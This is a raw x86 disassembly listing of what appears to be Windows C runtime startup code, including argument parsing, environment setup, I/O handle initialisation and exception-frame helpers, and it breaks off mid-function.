  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
